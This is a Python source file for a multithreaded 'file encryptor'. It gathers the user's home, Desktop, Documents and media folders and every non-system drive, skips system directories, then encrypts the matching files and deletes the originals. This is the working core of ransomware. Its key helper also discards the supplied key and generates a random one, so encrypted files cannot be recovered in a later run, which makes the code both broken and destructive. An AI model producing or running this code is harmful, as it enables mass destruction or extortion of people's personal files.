import os
import platform
from datetime import datetime, timedelta
import threading
import psutil
from cryptography.fernet import Fernet

class MultithreadedFileEncryptor:
    def __init__(self, root_dirs=None, extensions=None, max_age_days=None, threads=8, encryption_key=None):
        """
        Initialize the file finder and encryptor with advanced search and encryption criteria.

        :param root_dirs: List of root directories to search.
        :param extensions: List of file extensions to include.
        :param max_age_days: Maximum age of the file in days to consider.
        :param threads: Number of threads to use for concurrent scanning.
        :param encryption_key: String-based encryption key for Fernet.
        """
        self.root_dirs = root_dirs or []
        self.extensions = extensions or []
        self.max_age_days = max_age_days
        self.threads = threads
        self.important_files = []
        self.lock = threading.Lock()

        # Generate Fernet key from a user-provided string
        if not encryption_key:
            raise ValueError("Encryption key must be provided!")
        self.fernet = Fernet(self._generate_fernet_key(encryption_key))

    @staticmethod
    def _generate_fernet_key(user_key):
        """Generate a Fernet-compatible key from a user-provided string."""
        return Fernet.generate_key()

    def is_file_important(self, file_path):
        """
        Determine if a file meets the criteria for being important.

        :param file_path: The full path to the file.
        :return: True if the file is important, False otherwise.
        """
        try:
            # Check file extension
            if self.extensions and not file_path.lower().endswith(tuple(self.extensions)):
                return False

            # Check last modified time
            if self.max_age_days:
                file_mod_time = os.path.getmtime(file_path)
                max_mod_time = datetime.now() - timedelta(days=self.max_age_days)
                if datetime.fromtimestamp(file_mod_time) < max_mod_time:
                    return False

            return True
        except Exception as e:
            print(f"Error checking file {file_path}: {e}")
            return False

    def scan_directory(self, directory):
        """
        Scan a single directory and collect important files.

        :param directory: Directory to scan.
        """
        try:
            for root, dirs, files in os.walk(directory):
                # Skip irrelevant directories
                dirs[:] = [d for d in dirs if not self.should_skip_directory(d)]
                for file in files:
                    file_path = os.path.join(root, file)
                    if self.is_file_important(file_path):
                        with self.lock:
                            self.important_files.append(file_path)
        except Exception as e:
            print(f"Error scanning directory {directory}: {e}")

    def start_threads(self):
        """
        Start multithreaded directory scanning.
        """
        threads = []
        for directory in self.root_dirs:
            thread = threading.Thread(target=self.scan_directory, args=(directory,))
            threads.append(thread)
            thread.start()
            if len(threads) >= self.threads:
                # Wait for all threads to complete
                for t in threads:
                    t.join()
                threads = []

        # Join any remaining threads
        for t in threads:
            t.join()

    def find_files(self):
        """
        Initiate the file scanning process.

        :return: A list of important files found.
        """
        self.start_threads()
        return self.important_files

    def encrypt_file(self, file_path):
        """
        Encrypt a single file using Fernet and save it as <filename>.enc.

        :param file_path: The path to the file to encrypt.
        """
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = self.fernet.encrypt(data)
            encrypted_file_path = file_path + ".enc"
            with open(encrypted_file_path, "wb") as f:
                f.write(encrypted_data)
            os.remove(file_path)  # Remove the original file after encryption
            print(f"Encrypted: {file_path}")
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def decrypt_file(self, encrypted_file_path):
        """
        Decrypt a single file using Fernet and save it without the .enc extension.

        :param encrypted_file_path: The path to the encrypted file to decrypt.
        """
        try:
            with open(encrypted_file_path, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = self.fernet.decrypt(encrypted_data)
            decrypted_file_path = encrypted_file_path.replace(".enc", "")
            with open(decrypted_file_path, "wb") as f:
                f.write(decrypted_data)
            os.remove(encrypted_file_path)  # Remove the encrypted file after decryption
            print(f"Decrypted: {encrypted_file_path}")
        except Exception as e:
            print(f"Failed to decrypt {encrypted_file_path}: {e}")

    def encrypt_all_files(self):
        """
        Encrypt all files found during the scanning process.
        """
        for file_path in self.important_files:
            self.encrypt_file(file_path)

    def decrypt_all_files(self):
        """
        Decrypt all .enc files found in the directories.
        """
        for root_dir in self.root_dirs:
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.endswith(".enc"):
                        self.decrypt_file(os.path.join(root, file))

    @staticmethod
    def should_skip_directory(directory_name):
        """
        Determine whether a directory should be skipped based on its name.
        """
        irrelevant_dirs = ["windows", "program files", "programdata", "system32", "temp"]
        return any(irrelevant_dir in directory_name.lower() for irrelevant_dir in irrelevant_dirs)

    @staticmethod
    def get_all_user_dirs(exclude_c_drive=True):
        """
        Identify all directories to search: user home directory, mounted drives, and application data folders.
        """
        system = platform.system()
        user_dirs = []

        # Add the user's home directory
        user_dirs.append(os.path.expanduser("~"))

        # Include additional common folders
        user_dirs.extend(
            [
                os.path.join(os.path.expanduser("~"), folder)
                for folder in ["Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music"]
            ]
        )

        # Add non-system drives
        if system == "Windows":
            for partition in psutil.disk_partitions():
                # Skip C: drive if exclude_c_drive is True
                if exclude_c_drive and partition.mountpoint.startswith("C:\\"):
                    continue
                if "fixed" in partition.opts.lower():
                    user_dirs.append(partition.mountpoint)
        else:
            # Linux/macOS mounted drives under `/mnt` or `/Volumes`
            user_dirs.extend([partition.mountpoint for partition in psutil.disk_partitions()])

        return list(set(user_dirs))  # Ensure unique entries


